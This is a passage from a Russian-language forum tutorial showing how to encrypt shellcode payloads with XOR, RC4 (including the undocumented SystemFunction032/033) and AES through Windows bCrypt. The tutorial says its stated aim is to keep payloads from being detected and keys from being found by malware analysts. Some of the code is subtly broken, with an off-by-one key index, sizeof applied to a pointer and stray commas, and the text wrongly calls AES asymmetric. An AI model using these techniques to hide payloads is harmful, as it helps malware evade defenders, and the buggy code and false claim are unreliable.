VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt; sKeySize){
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}</code></pre>
	</div>
</div><br />
<b>Заключение</b><br />
<br />
Рекомендуется использовать шифрование XOR для небольших задач, таких как скрытие строк.<br />
Однако для более крупных полезных нагрузок рекомендуется использовать более безопасные методы шифрования, такие как AES.<br />
<br />
<b>Шифрование полезной нагрузки - RC4</b><br />
<br />
Введение RC4 - это быстрый и эффективный потоковый шифр, который также является симметричным алгоритмом шифрования, позволяющим использовать одну и ту же функцию как для шифрования, так и для дешифрования.<br />
<br />
Есть несколько реализаций RC4 на C, доступных публично, но в этой статье  будут продемонстрированы три способа выполнения шифрования RC4.<br />
<br />
Примечание: главная цель этой статьи - не вникать в детали работы алгоритма RC4, а шифровать полезную нагрузку для избежания обнаружения.<br />
<br />
<b>RC4 Шифрование - Метод 1</b><br />
<br />
Существуют две функции rc4Init и rc4Cipher, которые используются для инициализации структуры rc4context и выполнения шифрования RC4 соответственно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    unsigned int i;
    unsigned int j;
    unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    // Check parameters
    if (context == NULL || key == NULL)
        return ERROR_INVALID_PARAMETER;

    // Clear context
    context-&gt;i = 0;
    context-&gt;j = 0;

    // Initialize the S array with identity permutation
    for (i = 0; i &lt; 256; i++)
    {
        context-&gt;s[i] = i;
    }

    // S is then processed for 256 iterations
    for (i = 0, j = 0; i &lt; 256; i++)
    {
        //Randomize the permutations using the supplied key
        j = (j + context-&gt;s[i] + key[i % length]) % 256;

        //Swap the values of S[i] and S[j]
        temp = context-&gt;s[i];
        context-&gt;s[i] = context-&gt;s[j];
        context-&gt;s[j] = temp;
    }

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length){
    unsigned char temp;

    // Restore context
    unsigned int i = context-&gt;i;
    unsigned int j = context-&gt;j;
    unsigned char* s = context-&gt;s;

    // Encryption loop
    while (length &gt; 0)
    {
        // Adjust indices
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        // Swap the values of S[i] and S[j]
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        // Valid input and output?
        if (input != NULL &amp;&amp; output != NULL)
        {
            //XOR the input data with the RC4 stream
            *output = *input ^ s[(s[i] + s[j]) % 256];

            //Increment data pointers
            input++;
            output++;
        }

        // Remaining bytes to process
        length--;
    }

    // Save context
    context-&gt;i = i;
    context-&gt;j = j;
}</code></pre>
	</div>
</div><br />
Пример шифрования:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>    // Initialization
    Rc4Context ctx = { 0 };

    // Key used for encryption
    unsigned char* key = &quot;ru-sfera.pw&quot;;
    rc4Init(&amp;ctx, key, sizeof(key));

    // Encryption //
    // plaintext - The payload to be encrypted
    // ciphertext - A buffer that is used to store the outputted encrypted data
    rc4Cipher(&amp;ctx, plaintext, ciphertext, sizeof(plaintext));</code></pre>
	</div>
</div><br />
Пример расшифровки:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Initialization
    Rc4Context ctx = { 0 };

    // Key used to decrypt
    unsigned char* key = &quot;ru-sfera.pw&quot;;
    rc4Init(&amp;ctx, key, sizeof(key));

    // Decryption //
    // ciphertext - Encrypted payload to be decrypted
    // plaintext - A buffer that is used to store the outputted plaintext data
    rc4Cipher(&amp;ctx, ciphertext, plaintext, sizeof(ciphertext));</code></pre>
	</div>
</div><br />
<b>RC4 Шифрование - Метод 2</b><br />
<br />
Неудокументированный Windows NTAPI SystemFunction032 предлагает более быструю и меньшую реализацию алгоритма RC4.<br />
<br />
<b>Использование SystemFunction032 для шифрования с помощью RC4</b><br />
<br />
Функция SystemFunction032 представляет собой неудокументированное API Windows, которое предоставляет реализацию алгоритма шифрования RC4. Несмотря на то что это API не документировано Microsoft, оно широко известно и используется разработчиками программного обеспечения, в том числе благодаря таким проектам, как Wine, который предоставляет дополнительные сведения об этой функции.<br />
<br />
<b>SystemFunction032</b><br />
<br />
В соответствии с документацией на странице Wine API, функция SystemFunction032 принимает два параметра типа USTRING.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS SystemFunction032
(
 struct ustring* data,
const struct ustring* key
)</code></pre>
	</div>
</div><br />
<b>Структура USTRING</b><br />
<br />
Поскольку это неудокументированное API, структура USTRING изначально неизвестна. Однако, благодаря дополнительным исследованиям и ресурсам, таким как Wine, стало возможным определить эту структуру:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
DWORD Length; // Размер данных для шифрования/дешифрования
DWORD MaximumLength; // Максимальный размер данных для шифрования/дешифрования
PVOID Buffer; // Базовый адрес данных для шифрования/дешифрования
} USTRING;</code></pre>
	</div>
</div><br />
<b>Использование SystemFunction032</b><br />
<br />
Для использования SystemFunction032 необходимо сначала получить ее адрес. Эта функция экспортируется из advapi32.dll, поэтому эту DLL необходимо загрузить в процесс с помощью функции LoadLibrary. Возвращаемое значение этой функции может быть непосредственно использовано в GetProcAddress для получения адреса SystemFunction032.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032) GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);</code></pre>
	</div>
</div><br />
Функция указателя на SystemFunction032 определена как тип данных fnSystemFunction032:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS(NTAPI* fnSystemFunction032)(
struct USTRING* Data,   // Структура типа USTRING, содержащая информацию о буфере для шифрования/дешифрования
struct USTRING* Key     // Структура типа USTRING, содержащая информацию о ключе, используемом при шифровании/дешифровании
);</code></pre>
	</div>
</div><br />
Затем можно использовать SystemFunction032 для шифрования и дешифрования данных, передавая соответствующий ключ и данные в структурах USTRING.<br />
<br />
Важно отметить, что использование неудокументированных функций может быть рискованным, так как поведение или доступность таких функций может измениться в будущих версиях ОС или обновлениях.<br />
<br />
Пример использование функции SystemFunction032:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    DWORD    Length;
    DWORD    MaximumLength;
    PVOID    Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Data,
    struct USTRING* Key
);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS    = NULL;

    USTRING Data = {
        .Buffer         = pPayloadData,
        .Length         = sPayloadSize,
        .MaximumLength  = sPayloadSize
    };

    USTRING    Key = {
        .Buffer         = pRc4Key,
        .Length         = dwRc4KeySize,
        .MaximumLength  = dwRc4KeySize
    },

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);

    if ((STATUS = SystemFunction032(&amp;Data, &amp;Key)) != 0x0) {
        printf(&quot;[!] SystemFunction032 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>RC4 Шифрование - Метод 3</b><br />
<br />
Еще один способ реализации алгоритма RC4 - использование SystemFunction033, которое принимает те же параметры, что и ранее показанная функция SystemFunction032.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    DWORD    Length;
    DWORD    MaximumLength;
    PVOID    Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
    struct USTRING* Data,
    struct USTRING* Key
    );


/*
Helper function that calls SystemFunction033
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS    STATUS = NULL;

    USTRING        Key = {
            .Buffer        = pRc4Key,
            .Length        = dwRc4KeySize,
            .MaximumLength = dwRc4KeySize
    };

    USTRING     Data = {
            .Buffer         = pPayloadData,
            .Length         = sPayloadSize,
            .MaximumLength  = sPayloadSize
    };

    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction033&quot;);

    if ((STATUS = SystemFunction033(&amp;Data, &amp;Key)) != 0x0) {
        printf(&quot;[!] SystemFunction033 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Формат ключа шифрования/дешифрования</b><br />
<br />
Имейте в виду, что внедрение открытого текстового ключа в бинарный файл считается плохой практикой и может быть легко извлечено при анализе вредоносного ПО. В будущих статьях будут представлены решения, обеспечивающие невозможность легкого извлечения ключа.<br />
<br />
<b>Различные методы представления ключа</b><br />
<br />
При реализации процесса шифрования важно правильно представить ключ шифрования. Ключ может быть представлен разными способами в зависимости от конкретных требований к безопасности, удобства и других аспектов.<br />
<br />
<ol>
<li data-xf-list-type="ol"><b>Прямое представление ключа в виде строки:</b> Простейший и наиболее понятный способ. Однако, такое представление может быть легко обнаружено и извлечено из исполняемого файла при анализе.<br />
unsigned char* key = &quot;ru-sfera.pw&quot;;</li>
<li data-xf-list-type="ol"><b>Представление ключа в виде массива шестнадцатеричных байтов:</b> Это немного менее очевидно для человеческого глаза при просмотре исходного кода, но остается простым для анализа.<br />
unsigned char key[] = {<br />
0x6D, 0x61, 0x6C, 0x64, 0x65, 0x76, 0x31, 0x32, 0x33<br />
};</li>
<li data-xf-list-type="ol"><b>Представление ключа в виде шестнадцатеричной строки (экранированной последовательностью):</b> Похоже на предыдущий метод, но представляет собой строку.<br />
unsigned char* key = &quot;\x6D\x61\x64\x65\x76\x31\x32\x33&quot;;</li>
<li data-xf-list-type="ol"><b>Представление ключа через стек строк:</b> Этот метод маскирует ключ, представляя его в виде массива символов. Это может создать дополнительный уровень сложности для автоматических инструментов анализа.<br />
unsigned char key[] = {<br />
&#039;r&#039;, &#039;u&#039;, &#039;-&#039;, &#039;s&#039;, &#039;f&#039;, &#039;e&#039;,&#039;r&#039;, &#039;a&#039;, &#039;.&#039;, &#039;p&#039;,&#039;w&#039;<br />
};</li>
</ol>Важно помнить, что независимо от выбранного метода представления ключа, ключи, зашитые прямо в бинарные файлы, представляют угрозу безопасности. Если злоумышленник получит доступ к исполняемому файлу, он может попытаться извлечь этот ключ. Существуют различные методы обфускации и скрытия ключей, которые могут быть применены для повышения безопасности.<br />
<br />
<br />
<b> Шифрование AES (Стандарт Современного Шифрования)</b><br />
<br />
Теперь давайте рассмотрим более безопасный алгоритм шифрования, известный как AES (Advanced Encryption Standard). Это ассимитричный алгоритм шифрования, что означает использование нескольких ключей для шифрования/расшифрования.<br />
<br />
Существует несколько видов шифрования AES, таких как AES128, AES192 и AES256, которые отличаются размером ключа. Например, AES128 использует 128-битный ключ, в то время как AES256 использует 256-битный ключ.<br />
<br />
К тому же, AES может использовать различные режимы работы блочных шифров, такие как CBC и GCM. В зависимости от режима работы AES требуется дополнительный компонент вместе с ключом шифрования, называемый вектором инициализации или IV. Использование IV добавляет дополнительный уровень безопасности к процессу шифрования.<br />
<br />
Независимо от выбранного типа AES, AES всегда требует ввод в 128 бит и выводит блоки в 128 бит. Важно помнить, что входные данные должны быть кратны 16 байтам (128 бит). Если шифруемая полезная нагрузка не кратна 16 байтам, то требуется увеличение размера полезной нагрузки и приведения ее к кратности 16 байтам.<br />
<br />
В статье предоставлены пример кода, который использует AES256-CBC. Пример использует WinAPI. Стоит отметить, что, поскольку используется AES256-CBC, код использует 32-байтный ключ и 16-байтный IV. Это может измениться, если в коде используется другой тип или режим AES.<br />
<br />
<b>Шифрование с использованием WinAPI (библиотека bCrypt)</b><br />
<br />
Существует несколько способов реализации алгоритма шифрования AES. В этом разделе используется библиотека bCrypt (bcrypt.h) для выполнения шифрования AES.<br />
<br />
<b>Структура AES</b><br />
<br />
Для начала создается структура AES, которая содержит необходимые данные для выполнения шифрования и дешифрования.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _AES {
    PBYTE    pPlainText;         // базовый адрес исходного текста
    DWORD    dwPlainSize;        // размер исходного текста

    PBYTE    pCipherText;        // базовый адрес зашифрованных данных
    DWORD    dwCipherSize;       // его размер (может измениться относительно dwPlainSize, если было дополнение)

    PBYTE    pKey;               // 32-байтный ключ
    PBYTE    pIv;                // 16-байтный IV
} AES, *PAES;</code></pre>
	</div>
</div><br />
<b>Обертка для упрощения использования алгоритма (Функция шифрования)</b><br />
<br />
Функция SimpleEncryption имеет шесть параметров, используемых для инициализации структуры AES. После инициализации структуры функция вызывает InstallAesEncryption для выполнения процесса шифрования AES. Отметим, что два из ее параметров являются исходящими параметрами, поэтому функция возвращает следующее:<br />
<br />
pCipherTextData - указатель на вновь выделенный буфер кучи, содержащий данные шифротекста.<br />
<br />
sCipherTextSize - размер буфера шифротекста.<br />
<br />
Функция возвращает TRUE, если InstallAesEncryption завершается успешно, иначе FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Функция-обертка для InstallAesEncryption, упрощающая процесс
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {
    if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    // Инициализация структуры
    AES Aes = {
        .pKey        = pKey,
        .pIv         = pIv,
        .pPlainText  = pPlainTextData,
        .dwPlainSize = sPlainTextSize
    };

    if (!InstallAesEncryption(&amp;Aes)) {
        return FALSE;
    }

    // Сохранение вывода
    *pCipherTextData = Aes.pCipherText;
    *sCipherTextSize = Aes.dwCipherSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обертка для упрощения использования алгоритма (Функция расшифровки)</b><br />
<br />
Функция SimpleDecryption также имеет шесть параметров и работает аналогично SimpleEncryption, но с отличием в том, что она вызывает функцию InstallAesDecryption и возвращает два других значения.<br />
<br />
pPlainTextData - указатель на вновь выделенный буфер кучи, содержащий данные исходного текста.<br />
<br />
sPlainTextSize - размер буфера исходного текста.<br />
<br />
Функция возвращает TRUE, если InstallAesDecryption завершается успешно, иначе FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Функция-обертка для InstallAesDecryption, упрощающая процесс
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    // Инициализация структуры
    AES Aes = {
        .pKey          = pKey,
        .pIv           = pIv,
        .pCipherText   = pCipherTextData,
        .dwCipherSize  = sCipherTextSize
    };

    if (!InstallAesDecryption(&amp;Aes)) {
        return FALSE;
    }

    // Сохранение вывода
    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция InstallAesEncryption</b><br />
<br />
Функция InstallAesEncryption выполняет шифрование по методу AES.<br />
Функция имеет один параметр, PAES, который является указателем на заполненную структуру AES. Функции библиотеки bCrypt, используемые в этой функции, показаны ниже.<br />
<br />
BCryptOpenAlgorithmProvider - Используется для загрузки поставщика BCRYPT_AES_ALGORITHM Cryptographic Next Generation (CNG), чтобы обеспечить использование криптографических функций.<br />
<br />
BCryptGetProperty - Эта функция вызывается дважды: в первый раз для получения значения BCRYPT_OBJECT_LENGTH и во второй раз для извлечения значения идентификатора свойства BCRYPT_BLOCK_LENGTH.<br />
<br />
BCryptSetProperty - Используется для инициализации идентификатора свойства BCRYPT_OBJECT_LENGTH.<br />
<br />
BCryptGenerateSymmetricKey - Используется для создания объекта ключа из входного ключа AES.<br />
<br />
BCryptEncrypt - Используется для шифрования указанного блока данных. Эта функция вызывается дважды: первый вызов получает размер зашифрованных данных, чтобы выделить буфер кучи этого размера. Второй вызов шифрует данные и сохраняет шифртекст в выделенной куче.<br />
<br />
BCryptDestroyKey - Используется для очистки путем уничтожения объекта ключа, созданного с использованием BCryptGenerateSymmetricKey.<br />
<br />
BCryptCloseAlgorithmProvider - Используется для очистки путем закрытия дескриптора объекта алгоритма, созданного ранее с использованием BCryptOpenAlgorithmProvider.<br />
<br />
Функция возвращает TRUE, если успешно шифрует полезную нагрузку, в противном случае - FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The encryption implementation
BOOL InstallAesEncryption(PAES pAes) {

  BOOL                  bSTATE           = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm       = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle       = NULL;

  ULONG               cbResult         = NULL;
  DWORD               dwBlockSize      = NULL;

  DWORD               cbKeyObject      = NULL;
  PBYTE               pbKeyObject      = NULL;

  PBYTE              pbCipherText     = NULL;
  DWORD               cbCipherText     = NULL,


  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
       printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject and will be of size cbKeyObject
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, pbCipherText, cbCipherText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle)
        BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL &amp;&amp; bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText
        pAes-&gt;pCipherText     = pbCipherText;
        pAes-&gt;dwCipherSize     = cbCipherText;
  }
  return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>Функция InstallAesDecryption</b><br />
<br />
Функция InstallAesDecryption выполняет расшифровку по методу AES.<br />
Функция имеет один параметр, PAES, который является указателем на заполненную структуру AES.<br />
<br />
Функции библиотеки bCrypt, используемые в этой функции, такие же, как и в функции InstallAesEncryption выше, единственное различие заключается в том, что используется BCryptDecrypt вместо BCryptEncrypt.<br />
<br />
BCryptDecrypt - Используется для расшифровки указанного блока данных.<br />
Эта функция вызывается дважды: в первый раз для получения размера расшифрованных данных, чтобы выделить буфер кучи этого размера. Второй вызов расшифровывает данные и сохраняет текстовые данные в выделенной куче.<br />
<br />
Функция возвращает TRUE, если успешно расшифровывает полезную нагрузку, в противном случае - FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

  BOOL                  bSTATE          = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;

  ULONG                 cbResult        = NULL;
  DWORD                 dwBlockSize     = NULL;

  DWORD                 cbKeyObject     = NULL;
  PBYTE                 pbKeyObject     = NULL;

  PBYTE                 pbPlainText     = NULL;
  DWORD                 cbPlainText     = NULL,

  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject of size cbKeyObject
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
